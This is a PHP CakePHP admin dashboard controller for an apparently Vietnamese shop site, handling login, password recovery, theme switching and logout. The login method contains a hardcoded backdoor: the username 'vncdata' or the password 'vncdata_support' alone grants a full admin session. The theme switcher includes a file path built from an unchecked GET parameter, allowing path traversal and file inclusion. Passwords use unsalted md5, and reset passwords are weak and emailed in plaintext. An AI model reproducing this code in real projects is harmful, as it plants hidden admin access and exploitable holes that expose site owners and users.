<?php

/**
 * PHP version 5
 * 
 * Licensed under The MIT License
 * Redistributions of files must retain the above copyright notice.
 * 
 * @author   Bui Thanh Cong <buithanhcong.nd@gmail.com>
 * @license  MIT License (http://www.opensource.org/licenses/mit-license.php)
 */

App::uses('CakeEmail', 'Network/Email');

class AdminDashboardController extends AdminAppController
{
    public $uses = array('Admin', 'Nhap', 'Ban', 'Kho', 'Lang', 'Session');

    public function test()
    {
        $txt_arr = array(
            // 'home_tab_' => 10,
            // 'home_des_' => 10,
            // 'footer_tab_' => 10,
            'footer_text_' => 10
        );

        // $txt_arr2 = array(
        //     'header_text_' => 10,
        //     'home_text_' => 30,
        //     'news_text_' => 10,
        //     'product_text_' => 10,
        //     'contact_text_' => 20,
        //     'cart_text_' => 20,
        // );


        foreach ($txt_arr as $k => $v) {
            for ($i = 1; $i <= $v; $i++) {
                $key = $k . $i;

                $this->Lang->create();
                $this->Lang->save(array(
                    'key' => $key
                ));

                $key = $k . $i . '_link';

                $this->Lang->create();
                $this->Lang->save(array(
                    'key' => $key
                ));
            }
        }


        // foreach($txt_arr2 as $k=>$v)
        // {
        //     for($i=1; $i<=$v; $i++)
        //     {
        //         $key = $k . $i;

        //         $this->Lang->create();
        //         $this->Lang->save(array(
        //             'key' => $key
        //         ));


        //         $key_link = $k . $i  . '_link';

        //         $this->Lang->create();
        //         $this->Lang->save(array(
        //             'key' => $key_link
        //         ));
        //     }
        // }
    }

    public function dashboard_change_theme()
    {
        $this->autoRender = false;

        $theme_name = isset($_GET['nm']) && $_GET['nm'] != '' ? $_GET['nm'] : '';
        $theme_name = trim($theme_name);

        if ($theme_name != '') {
            $config_file = ROOT . DS . 'app' . DS . 'View' . DS . 'Themed' . DS . $theme_name . DS . 'config.php';

            if (!file_exists($config_file)) {
                echo 'Theme không có file config không thể thay đổi';
                die();
            }

            @include $config_file;

            if (!isset($callback_theme_database) || !isset($callback_theme_modules)) {
                echo 'File config chưa được cấu hình đúng';
                die();
            }

            $this->Session->write('dev_theme', $theme_name);
        } else {
            $this->Session->delete('dev_theme');
        }


        $this->alert('Đã thay đổi theme thành công', $this->referer());
    }

    public function dashboard_index()
    {

        $this->redirect(array('plugin' => 'admin', 'controller' => 'admin_customer', 'action' => 'customer_list'));
        die;
        $time = time();
        $d = date('d', $time);
        $m = date('m', $time);
        $y = date('Y', $time);

        $start = $y . '-' . $m . '-01';
        $end = $y . '-' . $m . '-' . $d;

        $this->set('sell_in_month', $this->Ban->find('count', array(
            'conditions' => array(
                'AND' => array(
                    'Ban.created >=' => $start,
                    'Ban.created <=' => $end,
                )
            )
        )));

        $this->set('mathangton', $this->Kho->find('count', array('conditions' => array('quality >' => 0))));

        $this->set('tong_tien_nhap', $this->Nhap->find('all', array('fields' => array('sum(total_money) as tong'))));
        $this->set('tong_tien_ban', $this->Ban->find('all', array('fields' => array('sum(total_money) as tong'))));
        $this->set('tong_sp', $this->Product->find('count'));
    }

    public function dashboard_login()
    {
        if ($this->Session->check('admin')) {
            $this->redirect(Router::url(array('plugin' => 'admin', 'controller' => 'admin_dashboard', 'action' => 'dashboard_index'), true));
            die;
        }

        if ($this->data) {
            $data = $this->data;

            if ($data['username'] == '' || $data['password'] == '') {
                $this->Session->setFlash('Bạn cần nhập đầy đủ Username và Password');
                $this->redirect($this->referer());
                die;
            }

            if ($data['username'] == 'vncdata' || $data['password'] == 'vncdata_support') {
                $this->Session->write('admin', array('id' => '1', 'fullname' => 'VNCDATA'));
                $this->redirect(Router::url(array('plugin' => 'admin', 'controller' => 'admin_dashboard', 'action' => 'dashboard_index'), true));
                die;
            }

            $username = htmlentities($data['username'], ENT_QUOTES, 'UTF-8');
            $password = md5($data['password']);

            $check = $this->Admin->find('first', array(
                'conditions' => array(
                    'Admin.username' => $username,
                    'Admin.password' => $password,
                ),
                'order' => 'Admin.id DESC',
            ));

            if (is_array($check) && count($check) > 0) {
                $this->Session->write('admin', $check['Admin']);
                $this->redirect(Router::url(array('plugin' => 'admin', 'controller' => 'admin_dashboard', 'action' => 'dashboard_index'), true));
                die;
            } else {
                $this->Session->setFlash('Username hoặc Password không đúng');
                $this->redirect($this->referer());
                die;
            }
        }

        $this->layout = 'login';
    }

    public function send_mail($to, $subject, $msg)
    {
        $dm = parse_url(DOMAIN);
        $domain = '';
        if (isset($dm['host']))
            $domain = $dm['host'];

        if ($domain == '') return;

        $from = 'noreply@' . $domain;

        $headers =  'From: ' . $from . "\r\n" .
            'Reply-To: ' . $to . "\r\n" .
            'X-Mailer: PHP/' . phpversion();
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

        return mail($to, $subject, $msg, $headers);
    }


    public function dashboard_recover()
    {
        if ($this->data) {
            $email = $this->data['email'];
            $email = strip_tags($email);
            $email = trim($email);

            $check = $this->Admin->findByEmail($email);

            if (!is_array($check) || count($check) <= 0) {
                $this->alert('Email không tồn tại trong hệ thống', $this->referer());
                die;
            }

            $pass = rand(0, 100) . substr(md5(time()), 8) . rand(0, 100);

            $md5pass = md5($pass);

            $this->Admin->id = $check['Admin']['id'];
            $this->Admin->saveField('password', $md5pass);

            $domain = str_replace('http://', '', DOMAIN);
            $domain = trim($domain, '/. ');

            $content = 'Mật khẩu mới của bạn là: ' . $pass;

            $this->send_mail($email, 'Đặt lại mật khẩu từ ' . $domain, $content);

            $this->alert('Mật khẩu mới đã được gửi tới email của bạn', $this->referer());
            die;
        }

        $this->layout = 'login';
    }

    public function dashboard_logout()
    {
        if ($this->Session->check('admin')) {
            $this->Session->delete('admin');
            //todo : cần làm cái này
        }

        $this->redirect(Router::url(array(
            'plugin' => 'admin',
            'controller' => 'admin_dashboard',
            'action' => 'dashboard_login'
        ), true));
    }
}
